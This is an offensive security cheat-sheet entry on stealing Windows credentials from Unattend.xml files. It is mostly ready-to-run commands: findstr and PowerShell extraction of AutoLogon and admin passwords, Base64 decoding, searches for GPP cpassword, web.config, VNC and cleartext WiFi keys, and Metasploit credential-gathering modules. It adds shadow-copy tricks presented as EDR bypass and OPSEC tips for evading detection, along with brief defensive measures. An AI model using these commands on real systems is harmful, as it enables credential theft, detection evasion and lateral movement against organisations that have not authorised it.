_platform: windows_
```
# View file contents
type C:\Windows\Panther\Unattend.xml

# Search for key fields
findstr /i /c:"Password" /c:"AutoLogon" /c:"AdminPassword" C:\Windows\Panther\Unattend.xml

# PowerShell extraction
[xml]$xml = Get-Content C:\Windows\Panther\Unattend.xml
$xml.unattend.settings.component | Where-Object { $_.AutoLogon } | ForEach-Object { $_.AutoLogon.Password.Value }
```
**Syntax breakdown:**
- `findstr /i /c:` — Case-insensitive search for a specified string _command_
- `Password` — Password field keyword _value_
- `AdminPassword` — Administrator password field _value_
- `AutoLogon` — AutoLogon configuration (contains cleartext password) _value_
- `[xml]$xml` — Parse the XML file into a PowerShell XML object _command_

**Decode Base64 passwords**
> If the password in Unattend.xml is stored Base64-encoded, it must be decoded. Windows uses UTF-16LE encoding, so it must be decoded as Unicode rather than ASCII
_platform: windows_
```
# PowerShell Base64 decode
$encoded = "QQBkAG0AaQBuAEAAMQAyADMA"  # encoded value extracted from the XML
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encoded))

# Or use certutil
echo QQBkAG0AaQBuAEAAMQAyADMA > C:\temp\encoded.txt
certutil -decode C:\temp\encoded.txt C:\temp\decoded.txt
type C:\temp\decoded.txt
```
**Syntax breakdown:**
- `[System.Text.Encoding]::Unicode` — UTF-16LE decoding (Windows default) _command_
- `FromBase64String` — Base64 decoding method _command_
- `certutil -decode` — Use the built-in system tool to decode Base64 _command_

**Check other sensitive installation files**
> Besides Unattend.xml, other locations may also store cleartext credentials
_platform: windows_
```
# Check GPP (Group Policy Preferences) passwords
findstr /S /I cpassword \\domain.com\sysvol\domain.com\policies\*.xml 2>nul

# Check IIS configuration files
type C:\inetpub\wwwroot\web.config 2>nul | findstr /i "connectionString password"

# Check VNC password files
reg query "HKCU\Software\ORL\WinVNC3\Password" 2>nul
reg query "HKLM\SOFTWARE\RealVNC\WinVNC4" /v Password 2>nul

# Check WiFi passwords
netsh wlan show profiles
netsh wlan show profile name="TargetWiFi" key=clear
```
**Syntax breakdown:**
- `cpassword` — AES-encrypted password field used by GPP (key is public) _value_
- `sysvol` — Domain controller share directory, readable by all domain users _value_
- `reg query` — Query password values in the registry _command_

**Automate with Metasploit**
> Use Metasploit post-exploitation modules to automatically search for and extract credentials from unattended installation files
_platform: windows_
```
# Metasploit module
use post/windows/gather/enum_unattend
set SESSION 1
run

# Alternatives
use post/multi/gather/firefox_creds
use post/windows/gather/credentials/gpp
use post/windows/gather/cachedump
```
**Syntax breakdown:**
- `post/windows/gather/enum_unattend` — Automatically search for and parse Unattend files _value_
- `post/windows/gather/credentials/gpp` — Extract credentials stored in GPP _value_

**EDR bypass variants:**

**Bypass file access monitoring**
> Bypass file access monitoring via volume shadow copy or streaming reads
_platform: windows_
```
# Use Volume Shadow Copy to read locked files
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\Panther\Unattend.xml C:\temp\u.xml

# Use PowerShell streaming reads to avoid file locks
[IO.File]::ReadAllText("C:\Windows\Panther\Unattend.xml")
```

**Analysis:** Unattended installation files are a byproduct of large-scale Windows deployment. The <UserAccounts>/<AutoLogon> nodes in these XML files may contain cleartext/encoded credentials for local or domain administrators. This vulnerability is extremely common in enterprise environments because IT departments frequently neglect to clean up these files after deployment.

**OPSEC tips:**
- File read operations usually do not trigger alerts, but large-scale file searches (dir /s) may be detected by EDR. It is recommended to check known paths directly rather than searching the entire disk.

**Overview:** Unattended installation files (Unattend.xml) are used for automated Windows deployment and may contain administrator credentials.

**Vulnerability principle:** In Unattend.xml files generated by Windows deployment tools (such as MDT and SCCM), passwords are stored in cleartext or weak encoding (Base64), and the files often remain on the system after deployment completes.

**Exploitation method:** Exploitation flow: 1) Search for Unattend/Sysprep files in default paths 2) Extract the Password/AutoLogon fields 3) Decode Base64 passwords 4) Use the obtained credentials for lateral movement

**Defensive measures:** Defensive measures: 1) Delete Unattend files immediately after deployment completes 2) Do not store domain administrator passwords in Unattend 3) Use LAPS to manage local administrator passwords 4) Audit sensitive files regularly

**References:**
- <https://attack.mitre.org/techniques/T1552/001/>

---
